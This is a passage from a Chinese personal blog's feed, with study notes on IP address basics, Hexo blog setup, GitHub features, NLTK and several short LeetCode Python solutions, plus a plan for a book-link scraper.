        <content type="html"><![CDATA[<p>自己造的小轮子。<br><a id="more"></a></p><h1 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h1><p>多页汇总分页批量获取书名作者和网盘链接<br>输入：网址<br>输出：书名、作者、链接  </p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><h1 id="遇到的问题及解决方案"><a href="#遇到的问题及解决方案" class="headerlink" title="遇到的问题及解决方案"></a>遇到的问题及解决方案</h1><table><thead><tr><th>问题描述</th><th>解决方案</th></tr></thead><tbody><tr><td>批量书合成一页还是每本书单独有序号</td><td>很多个人网站每个条目有自己的序号，按序号抓可不重不漏</td></tr><tr><td>正则表达式的引号问题</td><td>转义</td></tr><tr><td>网页可能不存在</td><td>try、except</td></tr><tr><td>匹配结果为0的情况</td><td>try、except</td></tr><tr><td>编译器vscode跑太慢</td><td>换回python自带IDLE，快很多</td></tr><tr><td>为啥跑着跑着就停了</td><td></td></tr></tbody></table><h1 id="待改进的地方"><a href="#待改进的地方" class="headerlink" title="待改进的地方"></a>待改进的地方</h1><h1 id="风险"><a href="#风险" class="headerlink" title="风险"></a>风险</h1><p>一级风险：原网站换<br>五级风险：原作者取消网盘链接</p>]]></content>
      
      
      
        <tags>
            
            <tag> achieve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IP地址</title>
      <link href="/cs/IP%E5%9C%B0%E5%9D%80/"/>
      <url>/cs/IP%E5%9C%B0%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<p>IP,Internet Protocol,“因特网协议”，“网络互联协议”,为计算机网络相互连接进行通信而设计的协议。计算机实现相互通信的一套规则。任何厂家生产的计算机系统，只要遵守IP协议就可以与因特网互连互通。连接成互联网。<br>IP地址被用来给Internet上的计算机进行编号。通过它可以轻松找到目标主机，IP地址是一台连接到Internet中的计算机的标志。<br>我们可以把“个人计算机”比作“一台电话”，那么“IP地址”就相当于“电话号码”，而Internet中的路由器，就相当于电信局的“程控式交换机”。<br><a id="more"></a><br>IP是计算机网络不可或缺的部分，IP地址是一台连接到Internet中的计算机的标志，通过它可以轻松找到目标主机。<br>IP是英文Internet Protocol的简称，意思是“网络之间互联的协议”，也就是为计算机网络相互连接进行通信而设计的协议。在因特网中，它是能使连接到网上的所有计算机实现相互通信的一套规则，规定了计算机在因特网上进行通信时应当遵守的规则。任何厂家生产的计算机系统，只要遵守IP协议就可以与因特网互连互通。正是因为有了IP协议，因特网才得以迅速发展成为世界上最大的、开放的计算机通信网络。因此，IP协议也可以叫做“因特网协议”。<br>IP地址被用来给Internet上的计算机进行编号。大家日常见到的情况是每台联网的计算机都需要有IP地址，才能正常通信。我们可以把“个人计算机”比作“一台电话”，那么“IP地址”就相当于“电话号码”，而Internet中的路由器，就相当于电信局的“程控式交换机”。<br>1.2.2  IP地址分类<br>最初设计互联网络时，为了便于寻址及层次化构造网络，每个IP地址包括两个标识码（ID），即网络ID和主机ID。同一个物理网络上的所有主机都使用同一个网络ID，网络上的一个主机（包括网络上的工作站、服务器和路由器等）有一个主机ID与其对应。Internet委员会定义了5种IP地址类型以适合不同容量的网络，即A类～E类。<br>其中，A、B、C三类（见表1-1）由Internet NIC在全球范围内统一分配，D、E类为特殊地址。<br>表1-1 IP地址分类<br>1.2.3  设置本机IP地址<br>在网络环境中，设置IP地址是最基础的环节，具体操作步骤如下。<br>1．选择“开始”/“控制面板”命令，选择“网络和Internet”选项，然后在“网络和Internet”窗口中选择“查看网络状态和任务”选项，如图1-1所示。<br>2．在“网络和共享窗口”里单击“本地连接”，如果使用的是无线连接，则单击“无线连接”。在这里我们用的是无线连接，单击后弹出“无线网络连接 状态”对话框，如图1-2所示。<br>3．单击“属性”按钮，在弹出的“无线网络连接 属性”对话框中选择“Internet协议版本4”，单击“属性”按钮，如图1-3所示。<br>4．在弹出的“Internet协议版本4”属性对话框中，选择“使用下面的IP地址”进行IP设置。设置完成后单击“确定”按钮，完成操作，如图1-4所示。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 黑客攻防 </tag>
            
            <tag> 计算机基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hello</title>
      <link href="/cs/hello/"/>
      <url>/cs/hello/</url>
      
        <content type="html"><![CDATA[<p>个人建站历程留影。<br><a id="more"></a></p><h1 id="迁移"><a href="#迁移" class="headerlink" title="迁移"></a>迁移</h1><ol><li>检查<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">安装</a><br><code>git versionnode -vhexo -v</code><br>若是hexo未安装：建io文件夹，进入io并在其下gitbash’npm install -g hexo-cli’。【io是要部署blog的文件夹，自己随意命名即可，保持一致就好】</li><li><code>hexo init</code></li><li>将 <a href="https://github.com/cjql/blog" target="_blank" rel="noopener">https://github.com/cjql/blog</a> 克隆并复制覆盖到io文件夹</li><li><code>npm install hexo-deployer-git --save</code></li><li><code>npm install --save hexo-generator-search</code></li><li>在io/source/_posts中新增文章</li><li><code>hexo g</code></li><li><code>hexo d</code></li><li><code>hexo s</code><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1></li></ol><table><thead><tr><th>主体</th><th>网址</th></tr></thead><tbody><tr><td>hexo</td><td><a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> <a href="https://hexo.io/docs/" target="_blank" rel="noopener">Documentation</a> <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a> <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a> <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a> <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a><br> <a href="https://xuanwo.io/2014/08/14/hexo-usual-problem/" target="_blank" rel="noopener">常见问题</a>  <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">Troubleshooting</a>  <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a> </td></tr><tr><td>moxfive</td><td><a href="http://moxfive.xyz/2015/08/20/blog-building/" target="_blank" rel="noopener">建站日志</a> <a href="http://moxfive.xyz/" target="_blank" rel="noopener">个人网站</a> <a href="https://github.com/MOxFIVE" target="_blank" rel="noopener">github</a></td></tr><tr><td>颜色</td><td><a href="http://www.w3school.com.cn/cssref/css_colorsfull.asp" target="_blank" rel="noopener">一览</a> <a href="https://www.sioe.cn/yingyong/yanse-rgb-16/" target="_blank" rel="noopener">转换</a></td></tr><tr><td>花案</td><td><a href="http://www.haowangming.cc/teshufuhao/" target="_blank" rel="noopener">特殊符号</a></td></tr></tbody></table><h1 id="遗留"><a href="#遗留" class="headerlink" title="遗留"></a>遗留</h1><h2 id="加油"><a href="#加油" class="headerlink" title="加油"></a>加油</h2><p>看配色方案：准备冷暖两套六级渐变色<br>首页如何列表显示<br>文章宽度如何调宽<br>如何调整文章显示顺序<br>top和按更新时间显示<br>如何加入分类</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>如何为姐姐快速部署一个呢？</p><blockquote><p>所需素材：六张背景图，一张图标，日志文件</p></blockquote><h1 id="2018年12月12日"><a href="#2018年12月12日" class="headerlink" title="2018年12月12日"></a>2018年12月12日</h1><h2 id="查看文章更新"><a href="#查看文章更新" class="headerlink" title="查看文章更新"></a>查看文章更新</h2><p><a href="https://github.com/cjql/blog/edit/master/themes/iyelee/layout/_partial/post/copyright.ejs" target="_blank" rel="noopener">themes\iyelee\layout_partial\post\copyright.ejs</a><br>非常值得细看，参考<a href="http://moxfive.xyz/2016/01/10/hexo-post-version-control/" target="_blank" rel="noopener">moxfive</a></p><h2 id="头像和ico"><a href="#头像和ico" class="headerlink" title="头像和ico"></a>头像和ico</h2><p><a href="https://github.com/cjql/blog/tree/master/themes/iyelee/source/resources" target="_blank" rel="noopener">themes\iyelee\source\resources</a></p><h2 id="设置背景图案"><a href="#设置背景图案" class="headerlink" title="设置背景图案"></a>设置背景图案</h2><p><a href="https://github.com/cjql/blog/tree/master/themes/iyelee/source/background" target="_blank" rel="noopener">themes\iyelee\source\background</a></p><h2 id="社区链接图标"><a href="#社区链接图标" class="headerlink" title="社区链接图标"></a>社区链接图标</h2><p><a href="https://github.com/cjql/blog/tree/master/themes/iyelee/source/img" target="_blank" rel="noopener">themes\iyelee\source\img</a></p><h2 id="修改头像背景"><a href="#修改头像背景" class="headerlink" title="修改头像背景"></a>修改头像背景</h2><p><a href="https://github.com/cjql/blog/edit/master/themes/iyelee/source/css/_partial/main.styl" target="_blank" rel="noopener">themes\iyelee\source\css_partial\main.styl</a></p><h2 id="标题字体颜色"><a href="#标题字体颜色" class="headerlink" title="标题字体颜色"></a>标题字体颜色</h2><p><a href="https://github.com/cjql/blog/edit/master/themes/iyelee/source/css/_partial/customise/heading.styl" target="_blank" rel="noopener">themes\iyelee\source\css_partial\customise\heading.styl</a><br>似乎会覆盖themes\iyelee\source\css_extend.styl文件</p><h2 id="标题字体大小"><a href="#标题字体大小" class="headerlink" title="标题字体大小"></a>标题字体大小</h2><p><a href="https://github.com/cjql/blog/edit/master/themes/iyelee/source/css/_extend.styl" target="_blank" rel="noopener">themes\iyelee\source\css_extend.styl</a></p><h2 id="主题配置文件"><a href="#主题配置文件" class="headerlink" title="主题配置文件"></a>主题配置文件</h2><p><a href="https://github.com/cjql/blog/edit/master/themes/iyelee/_config.yml" target="_blank" rel="noopener">blog\themes\iyelee_config.yml</a></p><h2 id="站点配置文件"><a href="#站点配置文件" class="headerlink" title="站点配置文件"></a>站点配置文件</h2><p><a href="https://github.com/cjql/blog/edit/master/_config.yml" target="_blank" rel="noopener">blog_config.yml</a></p><h1 id="排错"><a href="#排错" class="headerlink" title="排错"></a>排错</h1><blockquote><ul><li>检查_config.yml的空格</li></ul></blockquote><h2 id="Template-render-error"><a href="#Template-render-error" class="headerlink" title="Template render error"></a>Template render error</h2><p><a href="https://hexo.io/docs/troubleshooting#Escape-Contents" target="_blank" rel="noopener">https://hexo.io/docs/troubleshooting#Escape-Contents</a></p><h1 id="设计相关书单"><a href="#设计相关书单" class="headerlink" title="设计相关书单"></a>设计相关书单</h1><table><thead><tr><th>ISBN</th><th>Date</th><th>pages</th><th>price</th><th>author</th><th>title</th></tr></thead><tbody><tr><td>9787533543341</td><td>2013-8-1</td><td>140</td><td>CNY 29.80</td><td>理想·宅</td><td><a href="https://book.douban.com/subject/30197610/" target="_blank" rel="noopener">创意家居客厅造价与材料注释系列</a></td></tr><tr><td>9787533543372</td><td>2013-8-1</td><td>140</td><td>CNY 29.80</td><td>理想·宅</td><td><a href="https://book.douban.com/subject/30197611/" target="_blank" rel="noopener">创意家居客厅造价与材料注释系列</a></td></tr><tr><td>9787533543358</td><td>2013-7-1</td><td>140</td><td>CNY 29.80</td><td>理想·宅</td><td><a href="https://book.douban.com/subject/30197612/" target="_blank" rel="noopener">创意家居客厅造价与材料注释系列</a></td></tr><tr><td>9787533543365</td><td>2013-8-1</td><td>140</td><td>CNY 29.80</td><td>理想·宅</td><td><a href="https://book.douban.com/subject/30197613/" target="_blank" rel="noopener">创意家居客厅造价与材料注释系列</a></td></tr><tr><td>9780521128414</td><td></td><td></td><td></td><td></td><td><a href="https://book.douban.com/subject/30197614/" target="_blank" rel="noopener">reading William Blake</a></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td><a href="https://book.douban.com/subject/30197615/" target="_blank" rel="noopener"></a></td></tr><tr><td>9787533543310</td><td>2013-9-1</td><td>140</td><td>CNY 23.00</td><td>王双忠</td><td><a href="https://book.douban.com/subject/30197616/" target="_blank" rel="noopener">运动健身丛书</a></td></tr><tr><td>9787533552862</td><td>2017-8-1</td><td>30</td><td>CNY 32.00</td><td>哈皮童年</td><td><a href="https://book.douban.com/subject/30197617/" target="_blank" rel="noopener">中华传统经典故事绘本</a></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td><a href="https://book.douban.com/subject/30197618/" target="_blank" rel="noopener"></a></td></tr><tr><td>9781442496910</td><td>2014</td><td></td><td></td><td>Jordan Quinn</td><td><a href="https://book.douban.com/subject/30197619/" target="_blank" rel="noopener">The Kindom of Wrenly 1</a></td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> 后续学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hamming-distance</title>
      <link href="/cs/leetcode/hamming-distance/"/>
      <url>/cs/leetcode/hamming-distance/</url>
      
        <content type="html"><![CDATA[<p>汉明距离：两个整数转化为二进制后，求进制位上数字不同的个数。<br>hamming-distance <a href="https://leetcode.com/problems/hamming-distance/" target="_blank" rel="noopener">英文</a> <a href="https://leetcode-cn.com/problems/hamming-distance/" target="_blank" rel="noopener">中文</a></p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p><code>bin</code> , <code>^</code> , <code>count</code><br><a id="more"></a></p><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>汉明距离：两个整数转化为二进制后，求进制位上数字不同的个数。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hammingDistance</span><span class="params">(self, x, y)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type x: int</span></span><br><span class="line"><span class="string">        :type y: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> bin(x^y).count(<span class="string">'1'</span>)</span><br></pre></td></tr></table></figure><h2 id="收获-1"><a href="#收获-1" class="headerlink" title="收获"></a>收获</h2><p><code>bin</code> , <code>^</code> , <code>count</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 进制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github</title>
      <link href="/cs/github/"/>
      <url>/cs/github/</url>
      
        <content type="html"><![CDATA[<p>github学习笔记<br><a id="more"></a></p><h1 id="学习历程"><a href="#学习历程" class="headerlink" title="学习历程"></a>学习历程</h1><h2 id="Errors"><a href="#Errors" class="headerlink" title="Errors"></a>Errors</h2><h3 id="Updating-the-Git-index-failed"><a href="#Updating-the-Git-index-failed" class="headerlink" title="Updating the Git index failed."></a>Updating the Git index failed.</h3><p>参考：<a href="https://stackoverflow.com/questions/10573815/why-is-updating-the-git-index-failed-displayed" target="_blank" rel="noopener">stackoverflow</a></p><blockquote><p>再试试你这个罪魁祸首。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global core.autocrlf false</span><br></pre></td></tr></table></figure></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Updating the Git index failed.  A rescan will be automatically started to resynchronize git-gui.</span><br><span class="line"></span><br><span class="line">warning: LF will be replaced by CRLF in source/categories/index.md.</span><br><span class="line">The file will have its original line endings in your working directory</span><br></pre></td></tr></table></figure><h1 id="watch、star和fork"><a href="#watch、star和fork" class="headerlink" title="watch、star和fork"></a>watch、star和fork</h1><h2 id="watch"><a href="#watch" class="headerlink" title="watch"></a>watch</h2><p>该仓库的更新信息都会显示在用户的公开活动中。</p><h2 id="star"><a href="#star" class="headerlink" title="star"></a>star</h2><p>做书签用。反应仓库的受关注程度。判断仓库热门程度的指标</p><h2 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h2><p>参与这个库开发的人</p><h1 id="code"><a href="#code" class="headerlink" title="code"></a>code</h1><p>仓库文件列表。简要说明和URL</p><h2 id="commit-当前分支的提交历史"><a href="#commit-当前分支的提交历史" class="headerlink" title="commit 当前分支的提交历史"></a>commit 当前分支的提交历史</h2><h2 id="branches-分支列表"><a href="#branches-分支列表" class="headerlink" title="branches 分支列表"></a>branches 分支列表</h2><h2 id="releases-标签列表"><a href="#releases-标签列表" class="headerlink" title="releases 标签列表"></a>releases 标签列表</h2><p>可以将标签加入时的文件以归档形势（zip、tar.gz）下载到本地。软件在升级时一般需要打标签。<br><a href="https://git-scm.com/book/zh/v2/Git-%E5%9F%BA%E7%A1%80-%E6%89%93%E6%A0%87%E7%AD%BE" target="_blank" rel="noopener">https://git-scm.com/book/zh/v2/Git-%E5%9F%BA%E7%A1%80-%E6%89%93%E6%A0%87%E7%AD%BE</a><br>像其他版本控制系统（VCS）一样，Git 可以给历史中的某一个提交打上标签，以示重要。 比较有代表性的是人们会使用这个功能来标记发布结点（v1.0 等等）。 在本节中，你将会学习如何列出已有的标签、如何创建新标签、以及不同类型的标签分别是什么。</p><h2 id="contributors-pull-requests被采纳的人数-作者"><a href="#contributors-pull-requests被采纳的人数-作者" class="headerlink" title="contributors pull requests被采纳的人数+作者"></a>contributors pull requests被采纳的人数+作者</h2><h1 id="issue"><a href="#issue" class="headerlink" title="issue"></a>issue</h1><p>bug报告<br>功能添加<br>方向性讨论<br>Pull Request时会自动创建Issue</p><h2 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h2><p><strong>Open</strong>状态的Issue数</p><h1 id="Pull-Requests"><a href="#Pull-Requests" class="headerlink" title="Pull Requests"></a>Pull Requests</h1><p>列表查看并管理Pull Requests</p><h2 id="数字-1"><a href="#数字-1" class="headerlink" title="数字"></a>数字</h2><p>Open的Pull Requests数量</p><h1 id="wiki"><a href="#wiki" class="headerlink" title="wiki"></a>wiki</h1><p>提供页面描述功能。记录共享信息或软件文档。</p><h1 id="settings"><a href="#settings" class="headerlink" title="settings"></a>settings</h1><p>当前仓库的设置。</p><h1 id="Insight"><a href="#Insight" class="headerlink" title="Insight"></a>Insight</h1><h2 id="SSH-clone-URL"><a href="#SSH-clone-URL" class="headerlink" title="SSH clone URL"></a>SSH clone URL</h2><p>克隆仓库时所需要的URL</p><h2 id="Referring-sites"><a href="#Referring-sites" class="headerlink" title="Referring sites"></a>Referring sites</h2><p>访客来之前访问的网站</p><h2 id="Pulse"><a href="#Pulse" class="headerlink" title="Pulse"></a>Pulse</h2><p>显示该仓库最近的活动。issue和Pull Requests</p><h2 id="Graphs。似乎改成了Traffic"><a href="#Graphs。似乎改成了Traffic" class="headerlink" title="Graphs。似乎改成了Traffic"></a>Graphs。似乎改成了Traffic</h2><p>以图表形式显示该仓库的各项指标。</p><h2 id="network"><a href="#network" class="headerlink" title="network"></a>network</h2><p>以图表行政显示仓库当前的状态及fork出的状态。同时会显示成员列表。</p><h1 id="download-zip-与git-clone"><a href="#download-zip-与git-clone" class="headerlink" title="download zip 与git clone"></a>download zip 与git clone</h1><p>download zip：单纯下载到本地，无法查看日志和对仓库进行修改</p>]]></content>
      
      
      
        <tags>
            
            <tag> wiki </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fibonacci-number</title>
      <link href="/cs/leetcode/fibonacci-number/"/>
      <url>/cs/leetcode/fibonacci-number/</url>
      
        <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>求斐波那契的第 N+1 个值。<br>fibonacci-number <a href="https://leetcode.com/problems/fibonacci-number/" target="_blank" rel="noopener">英文</a> <a href="https://leetcode-cn.com/problems/fibonacci-number/" target="_blank" rel="noopener">中文</a></p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>1.负数下标更方便从右处理列表<br>2.注意体会边界的使用<br><a id="more"></a></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(self, N)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type N: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> N == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">elif</span> N == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fibs = [<span class="number">0</span>,<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">2</span>,N + <span class="number">1</span>):</span><br><span class="line">                fibs.append(fibs[<span class="number">-1</span>] + fibs[<span class="number">-2</span>])</span><br><span class="line">            <span class="keyword">return</span> fibs[<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>di-string-match</title>
      <link href="/cs/leetcode/di-string-match/"/>
      <url>/cs/leetcode/di-string-match/</url>
      
        <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>用只含字母 I 和 D 的字符串生成列表，使 I 对应的列表元素值升序排列， D对应的列表元素值降序排列<br>di-string-match <a href="https://leetcode.com/problems/di-string-match/" target="_blank" rel="noopener">英文</a> <a href="https://leetcode-cn.com/problems/di-string-match/" target="_blank" rel="noopener">中文</a></p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>1.用 0 和 字符串长度来初始化<br><a id="more"></a></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">diStringMatch</span><span class="params">(self, S)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type S: str</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        up, down = <span class="number">0</span>, len(S)</span><br><span class="line">        ans=[]</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> S:</span><br><span class="line">            <span class="keyword">if</span> x == <span class="string">'I'</span>:</span><br><span class="line">                ans.append(up)</span><br><span class="line">                up += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ans.append(down)</span><br><span class="line">                down -= <span class="number">1</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">return</span> ans + [up]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>array-partition-i</title>
      <link href="/cs/leetcode/array-partition-i/"/>
      <url>/cs/leetcode/array-partition-i/</url>
      
        <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>把 2n 个整数平分成 n 份，求每份中最小数之和的最大数。<br>array-partition-i <a href="https://leetcode.com/problems/array-partition-i/" target="_blank" rel="noopener">英文</a> <a href="https://leetcode-cn.com/problems/array-partition-i/" target="_blank" rel="noopener">中文</a></p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>1.<code>sorted</code>的用法<br>2.步距的妙用<br><a id="more"></a></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">arrayPairSum</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> sum(sorted(nums)[::<span class="number">2</span>])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>achieve</title>
      <link href="/cs/achieve/"/>
      <url>/cs/achieve/</url>
      
        <content type="html"><![CDATA[<p>思想的小巨人要脚踏实地呀。<br><a id="more"></a><br>achieve  todo  </p><h1 id="goal"><a href="#goal" class="headerlink" title="goal"></a>goal</h1><p>精通软件工程的生命周期<br>python、c、go、java<br>c：底层、操作系统、竞赛、算法。学好C转其他都很轻松。入门用py，C必须得学。<br>python：代码超过500行不可控。<br>Java：jvm<br>为数不多的，把各类模型都涉猎了，并且知道哪些有用哪些没用的投资者</p><h1 id="2018年12月10日"><a href="#2018年12月10日" class="headerlink" title="2018年12月10日"></a>2018年12月10日</h1><p>发现一个 bug ，hexo 的 post 里面不能建立一个名为 tags 的文章。</p>]]></content>
      
      
      
        <tags>
            
            <tag> todo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记：NLTK</title>
      <link href="/cs/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9ANLTK/"/>
      <url>/cs/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9ANLTK/</url>
      
        <content type="html"><![CDATA[<p>读书笔记：NLTK基础教程——用NLTK和Python库构建机器学习应用。<br><a id="more"></a></p><h1 id="书目"><a href="#书目" class="headerlink" title="书目"></a>书目</h1><h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><p>NLP入门（前几章）<br>《Speech and Language Processing》，由Daniel Jurafsky与James H. Martin合著。<br>《Statistical Natural Language Processing》，由Christopher D. Manning与Hinrich Schütze合著<br>维基百科上与NLP相关的页面。<a href="https://en.wikipedia.org/wiki/NLP" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/NLP</a></p><h1 id="残留"><a href="#残留" class="headerlink" title="残留"></a>残留</h1><p>help()是不是只能用于str和list。<br>答：否。dir(dict)以及import后再help。</p><h1 id="最"><a href="#最" class="headerlink" title="最"></a>最</h1><p>NLTK 库是当前自然语言处理（NLP）领域最为流行、使用最为广泛的库之一, 同时Python语言也已逐渐成为主流的编程语言之一。<br>关于这个问题，我们可以先来看看Gartner公司新一轮的趋势报告，你可以很清晰地看到，NLP技术赫然高居榜首。目前，NLP已被认为是业界最为稀缺的技能之一。<br>列表（list）是Python中最常用的数据结构之一。它们基本上相当于其他编程语言中的数组。<br>字典（dictionary）也是最常用到的数据结构之一。在其他编程语言中有时也被称为关联数组/存储。<br>字符串操作同时也是Python最主要的特性之一。</p><ul><li>在Python中，处理字符串会是一件非常轻松的工作。即使是那些非常简单的操作，例如字符串的切割，你也会看到相较于Java和C的大费周章，它在Python中是多么得简单明了。<h1 id="练级"><a href="#练级" class="headerlink" title="练级"></a>练级</h1>兴趣读者、爱好者、资深程序员、领域的研究人员、数据科学家。掌握一些NLP技能的人员。<h1 id="掌握技能"><a href="#掌握技能" class="headerlink" title="掌握技能"></a>掌握技能</h1><h2 id="理论：快速了解与一定的兴趣"><a href="#理论：快速了解与一定的兴趣" class="headerlink" title="理论：快速了解与一定的兴趣"></a>理论：快速了解与一定的兴趣</h2>编程语言、NLTK、NLP和语言学<br>python：基础教程、快速概览、快速浏览一下Python的基础要点（基础性的快速回顾之旅）、不同主题的Python的一些特性。基本的Python知识，如列表、字符串、正则表达式以及基本的I/O操作。<br><a href="#help">help and dir</a> <a href="#列表">列表</a><br>数据结构的基本知识，常用函数，Python通用结构。<br>对NLP爱好者来说，正则表达式是另一个非常重要的技能。<br>NLP：背景知识、相关概念、实用方面<br>###<br>在NLP领域以及使用Python编程方面具有一定的背景知识<br>与Python和NLP相关的快速入门<br>详细地了解Python这门语言<br>NLP相关的基本概念<br>与处理自然语言相关的特性<br>基本的NLP预处理步骤<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2>如何安装所需要的库。完成Python和NLTK及其他库的安装。安装了所有在NLTK工作中将会用到的程序。<br>pip install BeautifulSoup4 –user<br>演示了NLTK的使用思路<br>编写一些非常基本的Python和NLTK代码片段。能编写并运行基本的Python程序。<br>自行构建出一个能实际运行的、涉及云词的小型应用程序。<br>开始构建一个非常基本的单词云实例。能顺利地产生出云词。<br>如何构建一些NLP应用。构建出大部分与数据科学相关问题的单点解决方案。<br>围绕着NLTK构建起所需要的一切，并让Python在我们的系统上顺利地工作。<h2 id="实例"><a href="#实例" class="headerlink" 